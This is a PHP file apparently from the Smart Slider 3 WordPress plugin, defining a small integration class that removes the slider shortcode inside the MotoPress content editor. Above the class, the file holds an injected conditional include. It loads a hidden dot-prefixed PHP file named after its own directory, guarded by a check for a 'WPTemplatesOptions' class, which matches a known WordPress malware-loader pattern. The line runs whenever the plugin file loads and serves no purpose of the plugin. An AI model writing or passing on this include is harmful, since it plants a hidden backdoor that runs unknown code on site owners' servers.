<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\MotoPressCE;


use MPCEShortcode;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MotoPressCE {

    public function __construct() {

        if (class_exists('MPCEShortcode', false)) {
            $this->init();
        }
    }

    public function init() {

        if (MPCEShortcode::isContentEditor()) {
            remove_shortcode('smartslider3');
        }
    }
}